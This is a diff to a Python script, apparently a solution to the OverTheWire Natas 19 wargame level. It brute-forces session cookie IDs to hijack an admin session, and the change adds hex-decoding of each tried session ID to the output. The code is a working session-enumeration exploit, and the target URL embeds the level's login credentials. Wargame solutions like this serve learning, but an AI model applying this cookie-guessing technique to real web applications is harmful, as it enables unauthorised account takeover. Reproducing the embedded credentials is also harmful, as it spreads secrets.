@@ -1,5 +1,6 @@
 import requests
 import json
+import binascii
 
 url = "http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org"
 
@@ -14,7 +15,7 @@ while True:
 	try :
 		# Retrieve valid cookie by login in
 		s = requests.Session()
-		r = s.post(url, data={'username':'admin', 'password':'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'})
+		r = s.post(url, data={'username':'admin', 'password':'a'})
 		session_id = list(r.cookies.get_dict().values())[0]
 
 		prefix = session_id.replace(admin_suffix, '')
@@ -25,7 +26,7 @@ while True:
 
 		invalid_session = "Please login" in r.text
 		regular_user = "regular user" in r.text
-		print(f"[{count}] Trying session id {session_id} -- {'Regular user' if regular_user else ''} {'Invalid session' if invalid_session else ''}")
+		print(f"[{count}] Trying session id {session_id} -- {binascii.unhexlify(session_id).decode('utf-8')} -- {'Regular user' if regular_user else ''} {'Invalid session' if invalid_session else ''}")
 
 		if not regular_user and not invalid_session:
 			print("Found valid session id !")
